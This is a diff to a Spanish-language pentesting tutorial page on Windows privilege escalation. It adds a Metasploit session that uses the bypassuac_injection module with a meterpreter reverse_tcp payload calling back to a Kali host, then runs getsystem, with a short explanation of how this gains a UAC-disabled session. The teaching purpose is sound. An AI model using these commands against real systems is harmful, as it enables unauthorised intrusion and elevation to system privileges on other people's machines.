@@ -70,4 +70,17 @@ Una vez hecho esto, es necesario migrar a otro proceso, por ejemplo explorer, po
 UAC garantiza que los cambios realizados en el sistema operativo requieran la aprobación del administrador.
 Podemos utilizar el módulo “Windows Escalate UAC Protection Bypass (In Memory Injection)” para evadir UAC mediante la utilización de un certificado de editor de confianza y process injection. Este módulo genera una segunda shell en la que el indicador de UAC está desactivado.
 
+```bash
+msf > use exploit/windows/local/bypassuac_injection
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/local/bypassuac_injection) > set session id
+msf exploit(windows/local/bypassuac_injection) > set lhost ip_kali
+msf exploit(windows/local/bypassuac_injection) > set lport port_kali # Debemos asegurarnos de que es distinto al usado para obtener el acceso inicial
+msf exploit(windows/local/bypassuac_injection) > set target Windows\ x64 # O la arquitectura del sistema
+msf exploit(windows/local/bypassuac_injection) > exploit
+meterpreter > getsystem
+```
+
+La nueva sesión mantiene el mismo usuario, por lo que inicialmente no tiene privilegios. Lo que conseguimos con este módulo es una sesión con UAC desactivado y nos permite usar `getsystem` para elevar los privilegios.
+
 [⟵ Anterior](05_mejora_shell.md) | [Siguiente ⟶](07_linux_privesc.md)
